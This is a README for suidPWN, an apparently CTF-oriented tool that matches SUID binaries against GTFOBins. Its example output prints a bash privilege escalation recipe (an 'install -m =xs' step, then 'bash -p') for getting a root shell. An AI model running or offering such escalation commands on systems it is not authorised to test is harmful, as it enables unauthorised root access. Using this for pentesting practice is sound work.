# suidPWN
Speeding up identifying which binaries with a SUID flag may lead to root access

# about
We made this tool while working and different CTF boxes.  
The reason was to fast identify SUID binaries which are vulnerable to an LPE.  
  
All the credits of the local privilege escalation techniques go to gtfobins. These guys are awesome! <3  

# hints
- update the `binaries` files regulary
- when `suidPWN.py` identified a binary which allows privilege escalation, it scrapes the technique from `gtfobins` and stores it locally, so it does not have to scrape it again next time

# usage
## Updating the `binaries` file
```bash
$ python3 get_binaries_from_gtfobins.py
[*] Getting binary list from gtfobins...
[+] Done.
```

## practical example
```bash
$ python3 suidPWN.py
Paste your find output. When you are done press ctrl+d
-rwxr-sr-x 1 root shadow 71816 Jul 27  2018 /usr/bin/chage
-rwsr-xr-x 1 root root 34896 Apr 22  2020 /usr/bin/fusermount
-rwxr-sr-x 1 root shadow 31000 Jul 27  2018 /usr/bin/expiry
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwxr-sr-x 1 root tty 14736 May  4  2018 /usr/bin/bsd-write
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/bash
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwxr-sr-x 1 root shadow 39616 Feb 14  2019 /usr/sbin/unix_chkpwd
^D

[+] bash
[*] Getting bash escalation technique from gtfobins.github.io.
>
>	sudo install -m =xs $(which bash) .
>
>	./bash -p
>
>	source: https://gtfobins.github.io/gtfobins/bash
```
